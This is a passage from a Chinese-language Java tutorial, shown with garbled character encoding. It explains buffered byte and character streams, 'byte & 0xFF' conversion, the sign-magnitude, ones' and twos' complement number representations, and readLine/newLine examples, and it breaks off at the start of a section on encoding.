Streamï¼‰ä¸­ï¼Œç”±äºç¼“å†²åŒºçš„å¤§å°ä¸è¶³ä»¥å®¹çº³è¦å†™å…¥çš„æ•°æ®ï¼Œå¯¼è‡´æ•°æ®è¢«åˆ†å‰²æˆå¤šä¸ªéƒ¨åˆ†ï¼Œå¹¶åˆ†åˆ«å†™å…¥åˆ°ä¸åŒçš„ç¼“å†²åŒºä¸­ï¼Œæœ€ç»ˆéœ€è¦é€ä¸ªåˆ·æ–°ç¼“å†²åŒºï¼Œä»è€Œå¯¼è‡´æ€§èƒ½ä¸‹é™çš„é—®é¢˜ã€‚</p></blockquote><p>å…¶æ¬¡ï¼Œå¦‚æœå†™å…¥çš„å­—èŠ‚æ•°å°äºç¼“å†²åŒºé•¿åº¦ï¼Œåˆ™æ£€æŸ¥ç¼“å†²åŒºä¸­å‰©ä½™çš„ç©ºé—´æ˜¯å¦è¶³å¤Ÿå®¹çº³è¦å†™å…¥çš„å­—èŠ‚æ•°ï¼Œå¦‚æœä¸å¤Ÿï¼Œåˆ™å…ˆå°†ç¼“å†²åŒºä¸­çš„æ•°æ®åˆ·æ–°åˆ°ç£ç›˜ä¸­ã€‚ç„¶åï¼Œä½¿ç”¨ <code>System.arraycopy()</code> æ–¹æ³•å°†è¦å†™å…¥çš„æ•°æ®æ‹·è´åˆ°ç¼“å†²åŒºä¸­ï¼Œå¹¶æ›´æ–°è®¡æ•°å™¨ countã€‚</p><p>æœ€åï¼Œå¦‚æœå†™å…¥çš„å­—èŠ‚æ•°å°äºç¼“å†²åŒºé•¿åº¦ä¸”ç¼“å†²åŒºä¸­è¿˜æœ‰å‰©ä½™ç©ºé—´ï¼Œåˆ™ç›´æ¥å°†è¦å†™å…¥çš„æ•°æ®æ‹·è´åˆ°ç¼“å†²åŒºä¸­ï¼Œå¹¶æ›´æ–°è®¡æ•°å™¨ countã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåªæœ‰å½“ buf å†™æ»¡äº†ï¼Œæ‰ä¼š flushï¼Œå°†æ•°æ®åˆ·åˆ°ç£ç›˜ï¼Œé»˜è®¤ä¸€æ¬¡åˆ· 8192 ä¸ªå­—èŠ‚ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BufferedOutputStream</span><span class="params">(OutputStream out)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(out, <span class="number">8192</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœ buf æ²¡æœ‰å†™æ»¡ï¼Œä¼šç»§ç»­å†™ bufã€‚</p><p>å¯¹æ¯”ä¸€ä¸‹ FileOutputStream çš„ write æ–¹æ³•ï¼ŒåŒæ ·æ˜¯æœ¬åœ°æ–¹æ³•ï¼Œä¸€æ¬¡åªèƒ½å†™å…¥ä¸€ä¸ªå­—èŠ‚ã€‚</p><p><img src="https://cdn.tobebetterjavaer.com/stutymore/buffer-20230321162808.png"></p><p>å½“æŠŠ BufferedOutputStream å’Œ BufferedInputStream é…åˆèµ·æ¥ä½¿ç”¨åï¼Œå°±å‡å°‘äº†å¤§é‡çš„è¯»å†™æ¬¡æ•°ï¼Œå°¤å…¶æ˜¯ <code>byte[] bytes = new byte[8*1024]</code>ï¼Œå°±ç›¸å½“äºç¼“å†²åŒºçš„ç©ºé—´æœ‰ 8 ä¸ª 1024 å­—èŠ‚ï¼Œé‚£è¯»å†™æ•ˆç‡å°±ä¼šå¤§å¤§æé«˜ã€‚</p><h4 id="4ï¼‰byte-0xFF"><a href="#4ï¼‰byte-0xFF" class="headerlink" title="4ï¼‰byte &amp; 0xFF"></a>4ï¼‰<code>byte &amp; 0xFF</code></h4><p>byte ç±»å‹é€šå¸¸è¢«ç”¨äºå­˜å‚¨äºŒè¿›åˆ¶æ•°æ®ï¼Œä¾‹å¦‚è¯»å–å’Œå†™å…¥æ–‡ä»¶ã€ç½‘ç»œä¼ è¾“ç­‰åœºæ™¯ã€‚åœ¨è¿™äº›åœºæ™¯ä¸‹ï¼Œbyte ç±»å‹çš„å˜é‡å¯ä»¥ç”¨æ¥å­˜å‚¨æ•°æ®æµä¸­çš„æ¯ä¸ªå­—èŠ‚ï¼Œä»è€Œè¿›è¡Œè¯»å–å’Œå†™å…¥æ“ä½œã€‚</p><p>byte ç±»å‹æ˜¯æœ‰ç¬¦å·çš„ï¼Œå³å…¶å–å€¼èŒƒå›´ä¸º -128 åˆ° 127ã€‚å¦‚æœæˆ‘ä»¬å¸Œæœ›å¾—åˆ°çš„æ˜¯ä¸€ä¸ªæ— ç¬¦å·çš„ byte å€¼ï¼Œå°±éœ€è¦ä½¿ç”¨ <code>byte &amp; 0xFF</code> æ¥è¿›è¡Œè½¬æ¢ã€‚</p><p>è¿™æ˜¯å› ä¸º 0xFF æ˜¯ä¸€ä¸ªæ— ç¬¦å·çš„æ•´æ•°ï¼Œå®ƒçš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸º 11111111ã€‚å½“ä¸€ä¸ª byte ç±»å‹çš„å€¼ä¸ 0xFF è¿›è¡Œä½ä¸è¿ç®—æ—¶ï¼Œä¼šå°† byte ç±»å‹çš„å€¼è½¬æ¢ä¸ºä¸€ä¸ªæ— ç¬¦å·çš„æ•´æ•°ï¼Œå…¶èŒƒå›´ä¸º 0 åˆ° 255ã€‚</p><p>0xff æ˜¯ä¸€ä¸ªåå…­è¿›åˆ¶çš„æ•°ï¼Œç›¸å½“äºäºŒè¿›åˆ¶çš„ 11111111ï¼Œ&amp; è¿ç®—ç¬¦çš„æ„æ€æ˜¯ï¼šå¦‚æœä¸¤ä¸ªæ“ä½œæ•°çš„å¯¹åº”ä½ä¸º 1ï¼Œåˆ™è¾“å‡º 1ï¼Œå¦åˆ™ä¸º 0ï¼›ç”±äº 0xff æœ‰ 8 ä¸ª 1ï¼Œå•ä¸ª byte è½¬æˆ int å…¶å®å°±æ˜¯å°† byte å’Œ int ç±»å‹çš„ 255 è¿›è¡Œ(&amp;)ä¸è¿ç®—ã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ª byte ç±»å‹çš„å˜é‡ bï¼Œå…¶å€¼ä¸º -1ï¼Œé‚£ä¹ˆ b &amp; 0xFF çš„ç»“æœå°±æ˜¯ 255ã€‚è¿™æ ·å°±å¯ä»¥å°†ä¸€ä¸ªæœ‰ç¬¦å·çš„ byte ç±»å‹çš„å€¼è½¬æ¢ä¸ºä¸€ä¸ªæ— ç¬¦å·çš„æ•´æ•°ã€‚</p><p>&amp; è¿ç®—æ˜¯ä¸€ç§äºŒè¿›åˆ¶æ•°æ®çš„è®¡ç®—æ–¹å¼, ä¸¤ä¸ªæ“ä½œä½éƒ½ä¸º1ï¼Œç»“æœæ‰ä¸º1ï¼Œå¦åˆ™ç»“æœä¸º0. åœ¨ä¸Šé¢çš„ <code>getBufIfOpen()[pos++] &amp; 0xff</code> è®¡ç®—è¿‡ç¨‹ä¸­, byte æœ‰ 8bit, OXFF æ˜¯16è¿›åˆ¶çš„255, è¡¨ç¤ºçš„æ˜¯ int ç±»å‹, int æœ‰ 32bit.</p><p>å¦‚æœ <code>getBufIfOpen()[pos++]</code> ä¸º -118, é‚£ä¹ˆå…¶åŸç è¡¨ç¤ºä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000 00000000 00000000 10001010</span><br></pre></td></tr></table></figure><p>åç ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11111111 11111111 11111111 11110101</span><br></pre></td></tr></table></figure><p>è¡¥ç ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11111111 11111111 11111111 11110110</span><br></pre></td></tr></table></figure><p>0XFF è¡¨ç¤º16è¿›åˆ¶çš„æ•°æ®255, åŸç , åç , è¡¥ç éƒ½æ˜¯ä¸€æ ·çš„, å…¶äºŒè¿›åˆ¶æ•°æ®ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000 00000000 00000000 11111111</span><br></pre></td></tr></table></figure><p>0XFF å’Œ -118 è¿›è¡Œ&amp;è¿ç®—åç»“æœä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000 00000000 00000000 11110110</span><br></pre></td></tr></table></figure><p>è¿˜åŸä¸ºåŸç åä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000 00000000 00000000 10001010</span><br></pre></td></tr></table></figure><p>å…¶è¡¨ç¤ºçš„ int å€¼ä¸º 138ï¼Œå¯è§å°† byte ç±»å‹çš„ -118 ä¸ 0XFF è¿›è¡Œä¸è¿ç®—åå€¼ç”± -118 å˜æˆäº† int ç±»å‹çš„ 138ï¼Œå…¶ä¸­ä½8ä½å’Œbyteçš„-118å®Œå…¨ä¸€è‡´ã€‚</p><p>é¡ºå¸¦èŠä¸€ä¸‹ åŸç ã€åç å’Œè¡¥ç ã€‚</p><p>â‘ ã€åŸç </p><p>åŸç å°±æ˜¯ç¬¦å·ä½åŠ ä¸ŠçœŸå€¼çš„ç»å¯¹å€¼ï¼Œå³ç”¨ç¬¬ä¸€ä½è¡¨ç¤ºç¬¦å·ï¼Œå…¶ä½™ä½è¡¨ç¤ºå€¼ã€‚æ¯”å¦‚å¦‚æœæ˜¯8ä½äºŒè¿›åˆ¶:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+1]åŸ = 0000 0001</span><br><span class="line"></span><br><span class="line">[-1]åŸ = 1000 0001</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä½æ˜¯ç¬¦å·ä½ã€‚å› ä¸ºç¬¬ä¸€ä½æ˜¯ç¬¦å·ä½ï¼Œæ‰€ä»¥8ä½äºŒè¿›åˆ¶æ•°çš„å–å€¼èŒƒå›´å°±æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1111 1111 , 0111 1111]</span><br></pre></td></tr></table></figure><p>å³</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[-127 , 127]</span><br></pre></td></tr></table></figure><p>â‘¡ã€åç </p><p>åç çš„è¡¨ç¤ºæ–¹æ³•æ˜¯ï¼š</p><ul><li>æ­£æ•°çš„åç æ˜¯å…¶æœ¬èº«</li><li>è´Ÿæ•°çš„åç æ˜¯åœ¨å…¶åŸç çš„åŸºç¡€ä¸Šï¼Œç¬¦å·ä½ä¸å˜ï¼Œå…¶ä½™å„ä¸ªä½å–åã€‚</li></ul><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+1] = [00000001]åŸ = [00000001]å</span><br><span class="line"></span><br><span class="line">[-1] = [10000001]åŸ = [11111110]å</span><br></pre></td></tr></table></figure><p>å¯è§å¦‚æœä¸€ä¸ªåç è¡¨ç¤ºçš„æ˜¯è´Ÿæ•°ï¼Œäººè„‘æ— æ³•ç›´è§‚çš„çœ‹å‡ºæ¥å®ƒçš„æ•°å€¼ã€‚é€šå¸¸è¦å°†å…¶è½¬æ¢æˆåŸç å†è®¡ç®—ã€‚</p><p>â‘¢ã€è¡¥ç </p><p>è¡¥ç çš„è¡¨ç¤ºæ–¹æ³•æ˜¯ï¼š</p><ul><li>æ­£æ•°çš„è¡¥ç å°±æ˜¯å…¶æœ¬èº«</li><li>è´Ÿæ•°çš„è¡¥ç æ˜¯åœ¨å…¶åŸç çš„åŸºç¡€ä¸Šï¼Œç¬¦å·ä½ä¸å˜ï¼Œå…¶ä½™å„ä½å–åï¼Œæœ€å+1ã€‚(å³åœ¨åç çš„åŸºç¡€ä¸Š+1)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+1] = [00000001]åŸ = [00000001]å = [00000001]è¡¥</span><br><span class="line"></span><br><span class="line">[-1] = [10000001]åŸ = [11111110]å = [11111111]è¡¥</span><br></pre></td></tr></table></figure><p>å¯¹äºè´Ÿæ•°ï¼Œè¡¥ç è¡¨ç¤ºæ–¹å¼ä¹Ÿæ˜¯äººè„‘æ— æ³•ç›´è§‚çœ‹å‡ºå…¶æ•°å€¼çš„ã€‚é€šå¸¸ä¹Ÿéœ€è¦è½¬æ¢æˆåŸç åœ¨è®¡ç®—å…¶æ•°å€¼ã€‚</p><p>ä»ä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼š</p><ul><li>å¯¹äºæ­£æ•°ï¼šåŸç ï¼Œåç ï¼Œè¡¥ç éƒ½æ˜¯ä¸€æ ·çš„</li><li>å¯¹äºè´Ÿæ•°ï¼šåŸç ï¼Œåç ï¼Œè¡¥ç éƒ½æ˜¯ä¸ä¸€æ ·çš„</li></ul><h3 id="02ã€å­—ç¬¦ç¼“å†²æµ"><a href="#02ã€å­—ç¬¦ç¼“å†²æµ" class="headerlink" title="02ã€å­—ç¬¦ç¼“å†²æµ"></a>02ã€å­—ç¬¦ç¼“å†²æµ</h3><p>BufferedReader ç±»ç»§æ‰¿è‡ª Reader ç±»ï¼Œæä¾›äº†ä¸€äº›ä¾¿æ·çš„æ–¹æ³•ï¼Œä¾‹å¦‚ <code>readLine()</code> æ–¹æ³•å¯ä»¥ä¸€æ¬¡è¯»å–ä¸€è¡Œæ•°æ®ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦åœ°è¯»å–ã€‚</p><p>BufferedWriter ç±»ç»§æ‰¿è‡ª Writer ç±»ï¼Œæä¾›äº†ä¸€äº›ä¾¿æ·çš„æ–¹æ³•ï¼Œä¾‹å¦‚ <code>newLine()</code> æ–¹æ³•å¯ä»¥å†™å…¥ä¸€ä¸ªç³»ç»Ÿç‰¹å®šçš„è¡Œåˆ†éš”ç¬¦ã€‚</p><h4 id="1ï¼‰æ„é€ æ–¹æ³•-1"><a href="#1ï¼‰æ„é€ æ–¹æ³•-1" class="headerlink" title="1ï¼‰æ„é€ æ–¹æ³•"></a>1ï¼‰æ„é€ æ–¹æ³•</h4><ul><li><code>BufferedReader(Reader in)</code> ï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ç¼“å†²è¾“å…¥æµï¼Œæ³¨æ„å‚æ•°ç±»å‹ä¸º<strong>Reader</strong>ã€‚</li><li><code>BufferedWriter(Writer out)</code>ï¼š åˆ›å»ºä¸€ä¸ªæ–°çš„ç¼“å†²è¾“å‡ºæµï¼Œæ³¨æ„å‚æ•°ç±»å‹ä¸º<strong>Writer</strong>ã€‚</li></ul><p>ä»£ç ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºå­—ç¬¦ç¼“å†²è¾“å…¥æµ</span></span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;b.txt&quot;</span>));</span><br><span class="line"><span class="comment">// åˆ›å»ºå­—ç¬¦ç¼“å†²è¾“å‡ºæµ</span></span><br><span class="line"><span class="type">BufferedWriter</span> <span class="variable">bw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;b.txt&quot;</span>));</span><br></pre></td></tr></table></figure><h4 id="2ï¼‰å­—ç¬¦ç¼“å†²æµç‰¹æœ‰æ–¹æ³•"><a href="#2ï¼‰å­—ç¬¦ç¼“å†²æµç‰¹æœ‰æ–¹æ³•" class="headerlink" title="2ï¼‰å­—ç¬¦ç¼“å†²æµç‰¹æœ‰æ–¹æ³•"></a>2ï¼‰å­—ç¬¦ç¼“å†²æµç‰¹æœ‰æ–¹æ³•</h4><p>å­—ç¬¦ç¼“å†²æµçš„åŸºæœ¬æ–¹æ³•ä¸<a href="https://javabetter.cn/io/reader-writer.html">æ™®é€šå­—ç¬¦æµ</a>è°ƒç”¨æ–¹å¼ä¸€è‡´ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ï¼Œæˆ‘ä»¬æ¥çœ‹å­—ç¬¦ç¼“å†²æµ<strong>ç‰¹æœ‰</strong>çš„æ–¹æ³•ã€‚</p><ul><li>BufferedReaderï¼š<code>String readLine()</code>: <strong>è¯»ä¸€è¡Œæ•°æ®</strong>ï¼Œè¯»å–åˆ°æœ€åè¿”å› null</li><li>BufferedWriterï¼š<code>newLine()</code>: <strong>æ¢è¡Œ</strong>ï¼Œç”±ç³»ç»Ÿå®šä¹‰æ¢è¡Œç¬¦ã€‚</li></ul><p>æ¥çœ‹ <code>readLine()</code>æ–¹æ³•çš„ä»£ç ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºæµå¯¹è±¡</span></span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;a.txt&quot;</span>));</span><br><span class="line"><span class="comment">// å®šä¹‰å­—ç¬¦ä¸²,ä¿å­˜è¯»å–çš„ä¸€è¡Œæ–‡å­—</span></span><br><span class="line"><span class="type">String</span> <span class="variable">line</span>  <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="comment">// å¾ªç¯è¯»å–,è¯»å–åˆ°æœ€åè¿”å›null</span></span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine())!=<span class="literal">null</span>) &#123;</span><br><span class="line">    System.out.print(line);</span><br><span class="line">    System.out.println(<span class="string">&quot;------&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// é‡Šæ”¾èµ„æº</span></span><br><span class="line">br.close();</span><br></pre></td></tr></table></figure><p>å†æ¥çœ‹ <code>newLine()</code> æ–¹æ³•çš„ä»£ç ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºæµå¯¹è±¡</span></span><br><span class="line"><span class="type">BfferedWriter</span> <span class="variable">bw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;b.txt&quot;</span>));</span><br><span class="line"><span class="comment">// å†™å‡ºæ•°æ®</span></span><br><span class="line">bw.write(<span class="string">&quot;æ²‰&quot;</span>);</span><br><span class="line"><span class="comment">// å†™å‡ºæ¢è¡Œ</span></span><br><span class="line">bw.newLine();</span><br><span class="line">bw.write(<span class="string">&quot;é»˜&quot;</span>);</span><br><span class="line">bw.newLine();</span><br><span class="line">bw.write(<span class="string">&quot;ç‹&quot;</span>);</span><br><span class="line">bw.newLine();</span><br><span class="line">bw.write(<span class="string">&quot;äºŒ&quot;</span>);</span><br><span class="line">bw.newLine();</span><br><span class="line"><span class="comment">// é‡Šæ”¾èµ„æº</span></span><br><span class="line">bw.close();</span><br></pre></td></tr></table></figure><h3 id="03ã€å­—ç¬¦ç¼“å†²æµç»ƒä¹ "><a href="#03ã€å­—ç¬¦ç¼“å†²æµç»ƒä¹ " class="headerlink" title="03ã€å­—ç¬¦ç¼“å†²æµç»ƒä¹ "></a>03ã€å­—ç¬¦ç¼“å†²æµç»ƒä¹ </h3><p>æ¥æ¬£èµä¸€ä¸‹æˆ‘å†™çš„è¿™ç¯‡è¯—ï¼š</p><blockquote><p>6.å²‘å¤«å­ï¼Œä¸¹ä¸˜ç”Ÿï¼Œå°†è¿›é…’ï¼Œæ¯è«åœã€‚<br>1.å›ä¸è§é»„æ²³ä¹‹æ°´å¤©ä¸Šæ¥ï¼Œå¥”æµåˆ°æµ·ä¸å¤å›ã€‚<br>8.é’Ÿé¼“é¦”ç‰ä¸è¶³è´µï¼Œä½†æ„¿é•¿é†‰ä¸æ„¿é†’ã€‚<br>3.äººç”Ÿå¾—æ„é¡»å°½æ¬¢ï¼Œè«ä½¿é‡‘æ¨½ç©ºå¯¹æœˆã€‚<br>5.çƒ¹ç¾Šå®°ç‰›ä¸”ä¸ºä¹ï¼Œä¼šé¡»ä¸€é¥®ä¸‰ç™¾æ¯ã€‚<br>2.å›ä¸è§é«˜å ‚æ˜é•œæ‚²ç™½å‘ï¼Œæœå¦‚é’ä¸æš®æˆé›ªã€‚<br>7.ä¸å›æ­Œä¸€æ›²ï¼Œè¯·å›ä¸ºæˆ‘å€¾è€³å¬ã€‚<br>4.å¤©ç”Ÿæˆ‘æå¿…æœ‰ç”¨ï¼Œåƒé‡‘æ•£å°½è¿˜å¤æ¥ã€‚</p></blockquote><p>å¦‚ä½•æ‰èƒ½æŒ‰ç…§æ­£ç¡®çš„é¡ºåºæ¥å‘¢ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºmapé›†åˆ,ä¿å­˜æ–‡æœ¬æ•°æ®,é”®ä¸ºåºå·,å€¼ä¸ºæ–‡å­—</span></span><br><span class="line">HashMap&lt;String, String&gt; lineMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºæµå¯¹è±¡  æº</span></span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;logs/test.log&quot;</span>));</span><br><span class="line"><span class="comment">//ç›®æ ‡</span></span><br><span class="line"><span class="type">BufferedWriter</span> <span class="variable">bw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;logs/test1.txt&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯»å–æ•°æ®</span></span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine())!=<span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// è§£ææ–‡æœ¬</span></span><br><span class="line">    <span class="keyword">if</span> (line.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    String[] split = line.split(Pattern.quote(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">// ä¿å­˜åˆ°é›†åˆ</span></span><br><span class="line">    lineMap.put(split[<span class="number">0</span>], split[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// é‡Šæ”¾èµ„æº</span></span><br><span class="line">br.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// éå†mapé›†åˆ</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= lineMap.size(); i++) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> String.valueOf(i);</span><br><span class="line">    <span class="comment">// è·å–mapä¸­æ–‡æœ¬</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> lineMap.get(key);</span><br><span class="line">    <span class="comment">// å†™å‡ºæ‹¼æ¥æ–‡æœ¬</span></span><br><span class="line">    bw.write(key+<span class="string">&quot;.&quot;</span>+value);</span><br><span class="line">    <span class="comment">// å†™å‡ºæ¢è¡Œ</span></span><br><span class="line">    bw.newLine();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// é‡Šæ”¾èµ„æº</span></span><br><span class="line">bw.close();</span><br></pre></td></tr></table></figure><h2 id="Javaè½¬æ¢æµ"><a href="#Javaè½¬æ¢æµ" class="headerlink" title="Javaè½¬æ¢æµ"></a>Javaè½¬æ¢æµ</h2><p>è½¬æ¢æµå¯ä»¥å°†ä¸€ä¸ªå­—èŠ‚æµåŒ…è£…æˆå­—ç¬¦æµï¼Œæˆ–è€…å°†ä¸€ä¸ªå­—ç¬¦æµåŒ…è£…æˆå­—èŠ‚æµã€‚è¿™ç§è½¬æ¢é€šå¸¸ç”¨äºå¤„ç†æ–‡æœ¬æ•°æ®ï¼Œå¦‚è¯»å–æ–‡æœ¬æ–‡ä»¶æˆ–å°†æ•°æ®ä»ç½‘ç»œä¼ è¾“åˆ°åº”ç”¨ç¨‹åºã€‚</p><h3 id="01ã€ç¼–ç å’Œè§£ç "><a href="#01ã€ç¼–ç å’Œè§£ç " class="headerlink" title="01ã€ç¼–ç å’Œè§£ç "></a>01ã€ç¼–ç å’Œè§£ç </h3><p>åœ¨è®¡ç®—æœºä¸­ï¼Œæ•°æ®é€šå¸¸ä»¥äºŒè¿›åˆ¶å½¢å¼å­˜å‚¨å’Œä¼ è¾“ã€‚</p><ul><li>ç¼–ç å°±æ˜¯å°†åŸå§‹æ•°æ®ï¼ˆæ¯”å¦‚è¯´æ–‡æœ¬ã€å›¾åƒã€è§†é¢‘ã€éŸ³é¢‘ç­‰ï¼‰è½¬æ¢ä¸ºäºŒè¿›åˆ¶å½¢å¼ã€‚</li><li>è§£ç å°±æ˜¯å°†äºŒè¿›åˆ¶æ•°æ®è½¬æ¢ä¸ºåŸå§‹æ•°æ®ï¼Œæ˜¯ä¸€ä¸ªåå‘çš„è¿‡ç¨‹ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;æ²‰é»˜ç‹äºŒ&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">charsetName</span> <span class="operator">=</span> <span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¼–ç </span></span><br><span class="line"><span class="type">byte</span>[] bytes = str.getBytes(Charset.forName(charsetName));</span><br><span class="line">System.out.println(<span class="string">&quot;ç¼–ç : &quot;</span> + bytes);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è§£ç </span></span><br><span class="line"><span class="type">String</span> <span class="variable">decodedStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytes, Charset.forName(charsetName));</span><br><span class="line">System.out.println(<span class="string">&quot;è§£ç : &quot;</span> + decodedStr);</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œé¦–å…ˆå®šä¹‰äº†ä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡ str å’Œä¸€ä¸ªå­—ç¬¦é›†åç§° charsetNameã€‚ç„¶åï¼Œä½¿ç”¨ <code>Charset.forName()</code> æ–¹æ³•è·å–æŒ‡å®šå­—ç¬¦é›†çš„ Charset å¯¹è±¡ã€‚æ¥ç€ï¼Œä½¿ç”¨å­—ç¬¦ä¸²çš„ getBytes() æ–¹æ³•å°†å­—ç¬¦ä¸²ç¼–ç ä¸ºæŒ‡å®šå­—ç¬¦é›†çš„å­—èŠ‚æ•°ç»„ã€‚æœ€åï¼Œä½¿ç”¨ <code>new String()</code> 